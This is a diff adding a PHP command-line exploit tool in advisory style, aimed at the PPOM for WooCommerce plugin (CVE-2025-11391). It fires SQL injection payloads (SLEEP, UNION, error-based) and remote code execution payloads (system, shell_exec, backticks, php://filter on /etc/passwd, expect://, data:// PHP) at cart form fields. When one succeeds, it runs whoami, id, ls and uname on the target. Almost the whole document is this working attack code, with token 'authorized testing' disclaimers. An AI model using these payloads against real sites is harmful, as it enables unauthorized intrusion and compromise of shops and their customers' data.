@@ -1,0 +1,763 @@
+=============================================================================================================================================
+| # Title     : PPOM for WooCommerce 33.0.15 RCE                                                                                            |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://wordpress.org/plugins/woocommerce-product-addon/                                                                    |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/210742/ &  	CVE-2025-11391
+
+[+] Summary    : This script is an Advanced PHP CLI Security Testing Tool designed for authorized penetration testing. 
+                 It targets web applications to detect SQL Injection (SQLi) and Remote Code Execution (RCE) vulnerabilities using time-based, error-based, and behavior-based techniques.
+
+[+] PoC : php poc2.php --url 127.0.0.1 or php poc2.php -u 127.0.0.1 -t rce
+
+<?php
+
+
+class SecurityTesterCLI {
+    private $target_url;
+    private $test_timeout;
+    private $verbose;
+    private $method;
+    private $output_file;
+    private $attack_type;
+    private $user_agent;
+    
+    public function __construct($url, $timeout = 7, $attack_type = 'sql', $verbose = false, $method = 'auto', $output_file = null) {
+        $this->target_url = $url;
+        $this->test_timeout = $timeout;
+        $this->attack_type = $attack_type;
+        $this->verbose = $verbose;
+        $this->method = $method;
+        $this->output_file = $output_file;
+        $this->user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
+    }
+    
+    private function log($message, $type = 'info') {
+        $timestamp = date('Y-m-d H:i:s');
+        $prefix = '';
+        
+        switch ($type) {
+            case 'success':
+                $prefix = "[✓] ";
+                $color = "\033[0;32m";
+                break;
+            case 'error':
+                $prefix = "[✗] ";
+                $color = "\033[0;31m";
+                break;
+            case 'warning':
+                $prefix = "[!] ";
+                $color = "\033[0;33m";
+                break;
+            case 'info':
+                $prefix = "[*] ";
+                $color = "\033[0;36m";
+                break;
+            case 'critical':
+                $prefix = "[‼] ";
+                $color = "\033[1;31m";
+                break;
+            default:
+                $prefix = "[ ] ";
+                $color = "\033[0m";
+        }
+        
+        $formatted = "{$color}{$prefix}{$message}\033[0m";
+        echo $formatted . PHP_EOL;
+        
+        if ($this->output_file) {
+            $plain = "[{$timestamp}] {$prefix}{$message}" . PHP_EOL;
+            file_put_contents($this->output_file, $plain, FILE_APPEND);
+        }
+        
+        if ($this->verbose && $type == 'info') {
+            $debug_msg = "\033[90m[DEBUG] {$timestamp}: {$message}\033[0m" . PHP_EOL;
+            echo $debug_msg;
+        }
+    }
+    
+    // ==================== SQL Injection Payloads ====================
+    private function build_sql_payload($sleep_time = null) {
+        if ($sleep_time === null) {
+            $sleep_time = $this->test_timeout;
+        }
+        
+        // أنواع مختلفة من حمولات SQL Injection
+        $payloads = array(
+            'time_based' => array(
+                'name' => 'Time-Based Blind SQLi',
+                'payload' => "1 AND (SELECT 1 FROM (SELECT(SLEEP({$sleep_time})))A)",
+                'field' => 'ppom[fields][id]'
+            ),
+            'error_based' => array(
+                'name' => 'Error-Based SQLi',
+                'payload' => "1' AND 1=CONVERT(int,(SELECT @@version))--",
+                'field' => 'ppom[fields][id]'
+            ),
+            'union_based' => array(
+                'name' => 'Union-Based SQLi',
+                'payload' => "1' UNION SELECT NULL,@@version--",
+                'field' => 'ppom[fields][id]'
+            ),
+            'boolean_based' => array(
+                'name' => 'Boolean-Based SQLi',
+                'payload' => "1' AND '1'='1",
+                'field' => 'ppom[fields][id]'
+            )
+        );
+        
+        return $payloads;
+    }
+    
+    // ==================== RCE Payloads ====================
+    private function build_rce_payloads($test_type = 'all') {
+        // حمولات RCE لأنظمة مختلفة
+        $payloads = array(
+            'php' => array(
+                'name' => 'PHP Command Injection',
+                'payloads' => array(
+                    'system' => ';system(\'sleep ' . $this->test_timeout . '\');',
+                    'shell_exec' => ';echo shell_exec(\'sleep ' . $this->test_timeout . '\');',
+                    'exec' => ';exec(\'sleep ' . $this->test_timeout . '\');',
+                    'backtick' => ';`sleep ' . $this->test_timeout . '`;',
+                    'passthru' => ';passthru(\'sleep ' . $this->test_timeout . '\');'
+                ),
+                'fields' => array('ppom[fields][sql_injection]', 'ppom[ppom_option_price]', 'quantity')
+            ),
+            'os_command' => array(
+                'name' => 'OS Command Injection',
+                'payloads' => array(
+                    'unix_sleep' => ';sleep ' . $this->test_timeout . ';',
+                    'unix_ping' => ';ping -c 3 127.0.0.1;',
+                    'windows_sleep' => '& timeout /T ' . $this->test_timeout . ' &',
+                    'windows_ping' => '& ping -n 3 127.0.0.1 &',
+                    'pipe_unix' => '|sleep ' . $this->test_timeout . '|',
+                    'pipe_windows' => '|timeout /T ' . $this->test_timeout . '|'
+                ),
+                'fields' => array('ppom[fields][sql_injection]', 'ppom[ppom_option_price]', 'quantity')
+            ),
+            'file_inclusion' => array(
+                'name' => 'File Inclusion',
+                'payloads' => array(
+                    'php_wrapper' => 'php://filter/convert.base64-encode/resource=/etc/passwd',
+                    'expect' => 'expect://whoami',
+                    'data' => 'data://text/plain,<?php system("sleep ' . $this->test_timeout . '");?>',
+                    'input' => 'php://input'
+                ),
+                'fields' => array('ppom[fields][sql_injection]', 'ppom[ppom_option_price]')
+            ),
+            'code_eval' => array(
+                'name' => 'Code Evaluation',
+                'payloads' => array(
+                    'eval_php' => '<?php sleep(' . $this->test_timeout . ');?>',
+                    'assert_php' => '<?php assert("sleep(' . $this->test_timeout . ')");?>',
+                    'create_function' => '<?php $func=create_function(\'\',\'sleep(' . $this->test_timeout . ');\');$func();?>'
+                ),
+                'fields' => array('ppom[fields][sql_injection]')
+            )
+        );
+        
+        if ($test_type !== 'all' && isset($payloads[$test_type])) {
+            return array($test_type => $payloads[$test_type]);
+        }
+        
+        return $payloads;
+    }
+    
+    // ==================== Test Execution ====================
+    private function send_request($post_data, $custom_url = null) {
+        $url = $custom_url ?: $this->target_url;
+        $start_time = microtime(true);
+        
+        if ($this->method === 'curl' || ($this->method === 'auto' && function_exists('curl_version'))) {
+            return $this->send_curl_request($url, $post_data, $start_time);
+        } else {
+            return $this->send_file_request($url, $post_data, $start_time);
+        }
+    }
+    
+    private function send_curl_request($url, $post_data, $start_time) {
+        $ch = curl_init();
+        
+        curl_setopt_array($ch, array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_POST => true,
+            CURLOPT_POSTFIELDS => http_build_query($post_data),
+            CURLOPT_TIMEOUT => $this->test_timeout + 5,
+            CURLOPT_CONNECTTIMEOUT => 5,
+            CURLOPT_HEADER => true,
+            CURLOPT_USERAGENT => $this->user_agent,
+            CURLOPT_FOLLOWLOCATION => true,
+            CURLOPT_MAXREDIRS => 3,
+            CURLOPT_SSL_VERIFYPEER => false,
+            CURLOPT_SSL_VERIFYHOST => false
+        ));
+        
+        $response = curl_exec($ch);
+        $error = curl_error($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        $total_time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
+        
+        curl_close($ch);
+        
+        $end_time = microtime(true);
+        $duration = $end_time - $start_time;
+        
+        return array(
+            'duration' => $duration,
+            'error' => $error,
+            'http_code' => $http_code,
+            'response' => $response,
+            'method' => 'cURL'
+        );
+    }
+    
+    private function send_file_request($url, $post_data, $start_time) {
+        if (!ini_get('allow_url_fopen')) {
+            throw new Exception('allow_url_fopen is disabled');
+        }
+        
+        $options = array(
+            'http' => array(
+                'header'  => "Content-type: application/x-www-form-urlencoded\r\nUser-Agent: {$this->user_agent}",
+                'method'  => 'POST',
+                'content' => http_build_query($post_data),
+                'timeout' => $this->test_timeout + 5,
+                'ignore_errors' => true
+            ),
+            'ssl' => array(
+                'verify_peer' => false,
+                'verify_peer_name' => false
+            )
+        );
+        
+        $context = stream_context_create($options);
+        
+        try {
+            $response = @file_get_contents($url, false, $context);
+            
+            if ($response === false) {
+                $error = error_get_last();
+                $error_message = isset($error['message']) ? $error['message'] : 'Unknown error';
+                throw new Exception($error_message);
+            }
+            
+            $end_time = microtime(true);
+            $duration = $end_time - $start_time;
+            
+            return array(
+                'duration' => $duration,
+                'error' => null,
+                'http_code' => 200, // افتراضي
+                'response' => $response,
+                'method' => 'file_get_contents'
+            );
+            
+        } catch (Exception $e) {
+            $end_time = microtime(true);
+            $duration = $end_time - $start_time;
+            
+            return array(
+                'duration' => $duration,
+                'error' => $e->getMessage(),
+                'http_code' => 0,
+                'response' => null,
+                'method' => 'file_get_contents'
+            );
+        }
+    }
+    
+    // ==================== SQL Injection Tests ====================
+    public function test_sql_injection() {
+        $this->log("Starting SQL Injection Tests", 'info');
+        $this->log("Testing Time-Based Blind SQLi with SLEEP({$this->test_timeout})", 'info');
+        
+        $payloads = $this->build_sql_payload();
+        $results = array();
+        
+        foreach ($payloads as $type => $payload_info) {
+            $this->log("Testing: {$payload_info['name']}", 'info');
+            
+            $post_data = array(
+                'add-to-cart' => '72',
+                'quantity' => '1',
+                'ppom[fields][sql_injection]' => 'test_value',
+                $payload_info['field'] => $payload_info['payload'],
+                'ppom[ppom_option_price]' => '""'
+            );
+            
+            $result = $this->send_request($post_data);
+            $analysis = $this->analyze_sql_result($result, $payload_info['name']);
+            
+            $results[$type] = array(
+                'name' => $payload_info['name'],
+                'vulnerable' => $analysis['vulnerable'],
+                'duration' => $result['duration'],
+                'details' => $analysis['details']
+            );
+            
+            if ($analysis['vulnerable']) {
+                $this->log("VULNERABLE to {$payload_info['name']}!", 'success');
+                // توقف عن الاختبارات الأخرى إذا وجدنا ثغرة
+                if ($type === 'time_based' && $analysis['vulnerable']) {
+                    break;
+                }
+            } else {
+                $this->log("Not vulnerable to {$payload_info['name']}", 'info');
+            }
+            
+            // انتظار بين الطلبات لتجنب التحميل الزائد
+            sleep(1);
+        }
+        
+        return $results;
+    }
+    
+    private function analyze_sql_result($result, $test_name) {
+        $duration = $result['duration'];
+        $error = $result['error'];
+        
+        // للـ Time-Based SQLi
+        if (strpos($test_name, 'Time-Based') !== false) {
+            if ($error && preg_match('/timed\s*out/i', $error)) {
+                if ($duration >= $this->test_timeout - 0.5) {
+                    return array(
+                        'vulnerable' => true,
+                        'details' => "Timeout after {$duration}s confirms vulnerability"
+                    );
+                }
+            } elseif ($duration >= $this->test_timeout - 0.5) {
+                return array(
+                    'vulnerable' => true,
+                    'details' => "Delayed response ({$duration}s) indicates vulnerability"
+                );
+            }
+        }
+        
+        // للـ Error-Based SQLi
+        if (strpos($test_name, 'Error-Based') !== false) {
+            if ($result['response'] && (
+                preg_match('/SQL syntax/i', $result['response']) ||
+                preg_match('/mysql/i', $result['response']) ||
+                preg_match('/error/i', $result['response'])
+            )) {
+                return array(
+                    'vulnerable' => true,
+                    'details' => "SQL error found in response"
+                );
+            }
+        }
+        
+        return array(
+            'vulnerable' => false,
+            'details' => "No signs of vulnerability detected"
+        );
+    }
+    
+    // ==================== RCE Tests ====================
+    public function test_rce($rce_type = 'all') {
+        $this->log("Starting RCE (Remote Code Execution) Tests", 'info');
+        $this->log("Testing command execution with delay of {$this->test_timeout} seconds", 'info');
+        
+        $payloads = $this->build_rce_payloads($rce_type);
+        $results = array();
+        $vulnerable_found = false;
+        
+        foreach ($payloads as $category => $category_info) {
+            $this->log("Testing category: {$category_info['name']}", 'info');
+            
+            foreach ($category_info['payloads'] as $payload_name => $payload) {
+                $this->log("  Testing payload: {$payload_name}", 'info');
+                
+                // تجربة الحمولة في كل حقل ممكن
+                foreach ($category_info['fields'] as $field) {
+                    $post_data = array(
+                        'add-to-cart' => '72',
+                        'quantity' => '1',
+                        'ppom[fields][sql_injection]' => 'test_value',
+                        $field => $payload,
+                        'ppom[ppom_option_price]' => '""'
+                    );
+                    
+                    $this->log("    Field: {$field}", 'info');
+                    $result = $this->send_request($post_data);
+                    $analysis = $this->analyze_rce_result($result, $payload_name, $field);
+                    
+                    $result_key = "{$category}_{$payload_name}_{$field}";
+                    $results[$result_key] = array(
+                        'category' => $category_info['name'],
+                        'payload' => $payload_name,
+                        'field' => $field,
+                        'vulnerable' => $analysis['vulnerable'],
+                        'duration' => $result['duration'],
+                        'details' => $analysis['details']
+                    );
+                    
+                    if ($analysis['vulnerable']) {
+                        $this->log("    VULNERABLE! {$category_info['name']} via {$field}", 'success');
+                        $vulnerable_found = true;
+                        
+                        // محاولة استغلال إضافي إذا كانت ثغرة RCE
+                        if ($analysis['vulnerable']) {
+                            $this->attempt_rce_exploitation($field, $category);
+                        }
+                        
+                        break 2; // خروج من الحلقتين الداخليتين
+                    } else {
+                        $this->log("    Not vulnerable", 'info');
+                    }
+                    
+                    // انتظار قصير بين المحاولات
+                    usleep(500000); // 0.5 ثانية
+                }
+            }
+            
+            if ($vulnerable_found) {
+                break;
+            }
+        }
+        
+        return $results;
+    }
+    
+    private function analyze_rce_result($result, $payload_name, $field) {
+        $duration = $result['duration'];
+        $error = $result['error'];
+        $response = $result['response'];
+        
+        // الكشف بناءً على وقت الاستجابة
+        if (strpos($payload_name, 'sleep') !== false || 
+            strpos($payload_name, 'timeout') !== false ||
+            strpos($payload_name, 'ping') !== false) {
+            
+            if ($error && preg_match('/timed\s*out/i', $error)) {
+                if ($duration >= $this->test_timeout - 0.5) {
+                    return array(
+                        'vulnerable' => true,
+                        'details' => "Command execution confirmed by timeout"
+                    );
+                }
+            } elseif ($duration >= $this->test_timeout - 0.5) {
+                return array(
+                    'vulnerable' => true,
+                    'details' => "Command execution confirmed by delayed response"
+                );
+            }
+        }
+        
+        // الكشف بناءً على محتوى الاستجابة
+        if ($response) {
+            // البحث عن مخرجات الأوامر
+            if (preg_match('/127\.0\.0\.1/', $response) && 
+                (strpos($payload_name, 'ping') !== false)) {
+                return array(
+                    'vulnerable' => true,
+                    'details' => "Ping command output found in response"
+                );
+            }
+            
+            // البحث عن أخطاء PHP أو تنفيذ
+            if (preg_match('/Warning:|Notice:|Fatal error:|system\(|shell_exec\(/i', $response)) {
+                return array(
+                    'vulnerable' => true,
+                    'details' => "PHP execution evidence found"
+                );
+            }
+        }
+        
+        return array(
+            'vulnerable' => false,
+            'details' => "No evidence of command execution"
+        );
+    }
+    
+    private function attempt_rce_exploitation($field, $category) {
+        $this->log("Attempting further exploitation...", 'warning');
+        
+        $test_commands = array(
+            'whoami' => 'whoami',
+            'id' => 'id',
+            'pwd' => 'pwd',
+            'ls' => 'ls -la',
+            'dir' => 'dir',
+            'phpinfo' => 'phpinfo()',
+            'uname' => 'uname -a'
+        );
+        
+        foreach ($test_commands as $cmd_name => $command) {
+            $payload = '';
+            
+            if ($category === 'php') {
+                $payload = ';echo "\n[CMD: ' . $cmd_name . ']\n";';
+                $payload .= 'system("' . addslashes($command) . '");';
+                $payload .= 'echo "\n";';
+            } else {
+                $payload = ';echo "\n[CMD: ' . $cmd_name . ']\n";';
+                $payload .= $command . ';';
+                $payload .= 'echo "\n";';
+            }
+            
+            $post_data = array(
+                'add-to-cart' => '72',
+                'quantity' => '1',
+                'ppom[fields][sql_injection]' => 'test_value',
+                $field => $payload,
+                'ppom[ppom_option_price]' => '""'
+            );
+            
+            $result = $this->send_request($post_data);
+            
+            if ($result['response']) {
+                // استخراج مخرجات الأمر
+                $pattern = '/\[CMD: ' . preg_quote($cmd_name, '/') . '\]\s*(.*?)(?=\n\[CMD:|$)/s';
+                if (preg_match($pattern, $result['response'], $matches)) {
+                    $output = trim($matches[1]);
+                    if (!empty($output)) {
+                        $this->log("Command '{$cmd_name}' output: {$output}", 'critical');
+                    }
+                }
+            }
+            
+            usleep(300000); // 0.3 ثانية بين الأوامر
+        }
+    }
+    
+    // ==================== Main Test Runner ====================
+    public function run_complete_test() {
+        $this->show_banner();
+        
+        $this->log("Starting Comprehensive Security Test", 'info');
+        $this->log("Target: {$this->target_url}", 'info');
+        $this->log("Attack Type: " . strtoupper($this->attack_type), 'info');
+        $this->log("Timeout: {$this->test_timeout} seconds", 'info');
+        $this->log("Timestamp: " . date('Y-m-d H:i:s'), 'info');
+        $this->log("", 'info');
+        
+        $all_results = array();
+        
+        // تشغيل الاختبارات المطلوبة
+        if ($this->attack_type === 'sql' || $this->attack_type === 'all') {
+            $all_results['sql_injection'] = $this->test_sql_injection();
+        }
+        
+        if ($this->attack_type === 'rce' || $this->attack_type === 'all') {
+            $all_results['rce'] = $this->test_rce('all');
+        }
+        
+        $this->show_detailed_summary($all_results);
+        
+        return $all_results;
+    }
+    
+    private function show_banner() {
+        echo "\033[1;35m" . str_repeat("=", 60) . "\033[0m" . PHP_EOL;
+        echo "\033[1;35m" . "          ADVANCED SECURITY TESTER TOOL           " . "\033[0m" . PHP_EOL;
+        echo "\033[1;35m" . "       SQLi + RCE Vulnerability Scanner          " . "\033[0m" . PHP_EOL;
+        echo "\033[1;35m" . str_repeat("=", 60) . "\033[0m" . PHP_EOL . PHP_EOL;
+    }
+    
+    private function show_detailed_summary($results) {
+        echo PHP_EOL;
+        echo "\033[1;34m" . str_repeat("=", 60) . "\033[0m" . PHP_EOL;
+        echo "\033[1;34m" . "              DETAILED TEST SUMMARY              " . "\033[0m" . PHP_EOL;
+        echo "\033[1;34m" . str_repeat("=", 60) . "\033[0m" . PHP_EOL;
+        
+        $total_vulnerabilities = 0;
+        
+        foreach ($results as $test_type => $test_results) {
+            echo PHP_EOL . "\033[1;36m" . strtoupper(str_replace('_', ' ', $test_type)) . " RESULTS:\033[0m" . PHP_EOL;
+            
+            $type_vulnerabilities = 0;
+            foreach ($test_results as $key => $result) {
+                $status = $result['vulnerable'] ? 
+                    "\033[1;31mVULNERABLE\033[0m" : 
+                    "\033[1;32mSAFE\033[0m";
+                
+                $name = isset($result['name']) ? $result['name'] : (isset($result['category']) ? $result['category'] : 'Unknown');
+                echo "  • {$name}: {$status}";
+                
+                if ($result['vulnerable']) {
+                    echo " ({$result['details']})";
+                    $type_vulnerabilities++;
+                    $total_vulnerabilities++;
+                }
+                
+                if (isset($result['duration'])) {
+                    echo " [Time: " . number_format($result['duration'], 2) . "s]";
+                }
+                
+                echo PHP_EOL;
+            }
+            
+            if ($type_vulnerabilities > 0) {
+                echo "  \033[1;33mFound {$type_vulnerabilities} vulnerabilities!\033[0m" . PHP_EOL;
+            }
+        }
+        
+        echo PHP_EOL;
+        echo "\033[1;34m" . str_repeat("-", 60) . "\033[0m" . PHP_EOL;
+        
+        if ($total_vulnerabilities > 0) {
+            echo "\033[1;31m" . "‼ CRITICAL: {$total_vulnerabilities} VULNERABILITIES FOUND!" . "\033[0m" . PHP_EOL;
+            echo "\033[1;33m" . "  Immediate remediation required!" . "\033[0m" . PHP_EOL;
+            echo "\033[1;33m" . "  Recommendations:" . "\033[0m" . PHP_EOL;
+            echo "\033[1;33m" . "  1. Update all software components" . "\033[0m" . PHP_EOL;
+            echo "\033[1;33m" . "  2. Implement input validation/sanitization" . "\033[0m" . PHP_EOL;
+            echo "\033[1;33m" . "  3. Use prepared statements for SQL" . "\033[0m" . PHP_EOL;
+            echo "\033[1;33m" . "  4. Disable dangerous PHP functions" . "\033[0m" . PHP_EOL;
+        } else {
+            echo "\033[1;32m" . "✓ No vulnerabilities detected in this scan" . "\033[0m" . PHP_EOL;
+            echo "\033[1;36m" . "  Note: This doesn't guarantee complete security" . "\033[0m" . PHP_EOL;
+        }
+        
+        echo PHP_EOL;
+        echo "\033[1;36m" . "Scan completed at: " . date('Y-m-d H:i:s') . "\033[0m" . PHP_EOL;
+    }
+}
+
+// ==================== CLI Interface ====================
+function show_help() {
+    echo "\033[1;33m" . "Advanced Security Tester - Usage Guide" . "\033[0m" . PHP_EOL;
+    echo "\033[1;33m" . str_repeat("=", 50) . "\033[0m" . PHP_EOL . PHP_EOL;
+    
+    echo "\033[1;32m" . "Required:" . "\033[0m" . PHP_EOL;
+    echo "  --url, -u      Target URL" . PHP_EOL . PHP_EOL;
+    
+    echo "\033[1;32m" . "Attack Types:" . "\033[0m" . PHP_EOL;
+    echo "  --type, -t     Test type: sql, rce, all (default: all)" . PHP_EOL . PHP_EOL;
+    
+    echo "\033[1;32m" . "Options:" . "\033[0m" . PHP_EOL;
+    echo "  --timeout, -s  Sleep/delay time in seconds (default: 7)" . PHP_EOL;
+    echo "  --method, -m   Request method: curl, file, auto (default: auto)" . PHP_EOL;
+    echo "  --verbose, -v  Enable verbose output" . PHP_EOL;
+    echo "  --output, -o   Save results to file" . PHP_EOL;
+    echo "  --help, -h     Show this help" . PHP_EOL . PHP_EOL;
+    
+    echo "\033[1;32m" . "Examples:" . "\033[0m" . PHP_EOL;
+    echo "  php security_tester.php -u http://target.com/" . PHP_EOL;
+    echo "  php security_tester.php -u http://target.com -t sql -s 5" . PHP_EOL;
+    echo "  php security_tester.php -u http://target.com -t rce -v" . PHP_EOL;
+    echo "  php security_tester.php -u http://target.com -t all -o scan.log" . PHP_EOL . PHP_EOL;
+    
+    echo "\033[1;31m" . "WARNING: For authorized penetration testing only!" . "\033[0m" . PHP_EOL;
+    echo "\033[1;31m" . "Legal use requires explicit permission from system owner." . "\033[0m" . PHP_EOL;
+    exit(0);
+}
+
+function main() {
+    $options = getopt("u:t:s:m:vo:h", array("url:", "type:", "timeout:", "method:", "verbose", "output:", "help"));
+    
+    if (isset($options['h']) || isset($options['help'])) {
+        show_help();
+    }
+    
+    // الحصول على القيم مع دعم PHP 5.x
+    $url = '';
+    if (isset($options['u'])) {
+        $url = $options['u'];
+    } elseif (isset($options['url'])) {
+        $url = $options['url'];
+    }
+    
+    if (empty($url)) {
+        echo "\033[1;31m" . "Error: Target URL is required!" . "\033[0m" . PHP_EOL;
+        echo "Use --help for usage information." . PHP_EOL;
+        exit(1);
+    }
+    
+    $attack_type = 'all';
+    if (isset($options['t'])) {
+        $attack_type = $options['t'];
+    } elseif (isset($options['type'])) {
+        $attack_type = $options['type'];
+    }
+    
+    $timeout = 7;
+    if (isset($options['s'])) {
+        $timeout = intval($options['s']);
+    } elseif (isset($options['timeout'])) {
+        $timeout = intval($options['timeout']);
+    }
+    
+    $method = 'auto';
+    if (isset($options['m'])) {
+        $method = $options['m'];
+    } elseif (isset($options['method'])) {
+        $method = $options['method'];
+    }
+    
+    $verbose = isset($options['v']) || isset($options['verbose']);
+    
+    $output_file = null;
+    if (isset($options['o'])) {
+        $output_file = $options['o'];
+    } elseif (isset($options['output'])) {
+        $output_file = $options['output'];
+    }
+    
+    // التحقق من المدخلات
+    if (!in_array($attack_type, array('sql', 'rce', 'all'))) {
+        echo "\033[1;31m" . "Error: Type must be 'sql', 'rce', or 'all'" . "\033[0m" . PHP_EOL;
+        exit(1);
+    }
+    
+    if ($timeout < 1 || $timeout > 30) {
+        echo "\033[1;31m" . "Error: Timeout must be between 1 and 30 seconds" . "\033[0m" . PHP_EOL;
+        exit(1);
+    }
+    
+    if (!in_array($method, array('auto', 'curl', 'file'))) {
+        echo "\033[1;31m" . "Error: Method must be 'auto', 'curl', or 'file'" . "\033[0m" . PHP_EOL;
+        exit(1);
+    }
+    
+    // إضافة http:// إذا لم يكن موجودًا
+    if (!preg_match('/^https?:\/\//', $url)) {
+        $url = 'http://' . $url;
+    }
+    
+    // إشعار أمني
+    echo "\033[1;31m" . " SECURITY NOTICE:" . "\033[0m" . PHP_EOL;
+    echo "This tool is for authorized security testing only." . PHP_EOL;
+    echo "Unauthorized use is illegal and unethical." . PHP_EOL;
+    echo "Proceed only if you have explicit permission." . PHP_EOL . PHP_EOL;
+    
+    echo "Starting scan in 3 seconds...";
+    for ($i = 3; $i > 0; $i--) {
+        echo " {$i}";
+        sleep(1);
+    }
+    echo PHP_EOL . PHP_EOL;
+    
+    try {
+        $tester = new SecurityTesterCLI($url, $timeout, $attack_type, $verbose, $method, $output_file);
+        $tester->run_complete_test();
+    } catch (Exception $e) {
+        echo "\033[1;31m" . "Error: " . $e->getMessage() . "\033[0m" . PHP_EOL;
+        exit(1);
+    }
+    
+    exit(0);
+}
+
+// التحقق من إصدار PHP
+if (version_compare(PHP_VERSION, '5.4.0', '<')) {
+    echo "\033[1;31m" . "Error: PHP 5.4 or higher is required!" . "\033[0m" . PHP_EOL;
+    echo "Current PHP version: " . PHP_VERSION . PHP_EOL;
+    exit(1);
+}
+
+// بدء التشغيل
+if (PHP_SAPI === 'cli') {
+    main();
+} else {
+    echo "\033[1;31m" . "This script must be run from the command line." . "\033[0m" . PHP_EOL;
+    echo "Usage: php " . basename(__FILE__) . " --url <target_url>" . PHP_EOL;
+}
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
